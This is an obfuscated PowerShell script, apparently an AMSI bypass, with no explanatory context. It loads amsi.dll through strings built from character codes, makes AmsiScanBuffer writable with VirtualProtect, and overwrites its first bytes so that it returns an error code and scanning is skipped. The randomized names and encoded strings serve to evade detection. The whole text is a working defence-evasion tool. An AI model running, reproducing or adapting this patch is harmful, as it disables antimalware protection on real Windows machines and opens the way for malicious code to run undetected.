$_Az1D = @"
using System;
using System.Runtime.InteropServices;
public class _Az1D {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr dJasiCTkRNoHM3s, string ktC6_uxiNnprT6oW);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr dnwLlbB3btrWuixJq, UIntPtr eDqfWWwi4_bh2a, uint pU77TgGhtamT, out uint Fqg8KorvO5iLWG8E);
}
"@

Add-Type $_Az1D

$_DDe5Rs = [_Az1D]::LoadLibrary("$([chaR](97)+[chAR](109+59-59)+[CHAR](110+5)+[CHar]([Byte]0x69)+[cHar]([bYtE]0x2e)+[ChAR]([bytE]0x64)+[ChAR](108*34/34)+[ChAr](12+96))")
$GWR = [_Az1D]::GetProcAddress($_DDe5Rs, "$([CHAR](21+44)+[ChaR]([BYTE]0x6d)+[cHar]([ByTE]0x73)+[char](105)+[cHaR]([bytE]0x53)+[chAr]([BYTE]0x63)+[CHaR](97*62/62)+[cHAr](110)+[cHAR](52+14)+[CHAR]([BYTE]0x75)+[ChaR](102+63-63)+[ChaR](102)+[ChaR](101+35-35)+[CHar]([BYTe]0x72))")
$p = 0
[_Az1D]::VirtualProtect($GWR, [uint32]5, 0x40, [ref]$p)
$xC4VV = "0xB8"
$wLa = "0x57"
$tY_d = "0x00"
$D7nnzn_gWA6TtjyjXUE3 = "0x07"
$Ri4d1SnZbaU = "0x80"
$ZORMGwORU_Nu = "0xC3"
$N7kJG_OP9rcajnzUg6Z = [Byte[]] ($xC4VV,$wLa,$tY_d,$D7nnzn_gWA6TtjyjXUE3,+$Ri4d1SnZbaU,+$ZORMGwORU_Nu)
[System.Runtime.InteropServices.Marshal]::Copy($N7kJG_OP9rcajnzUg6Z, 0, $GWR, 6)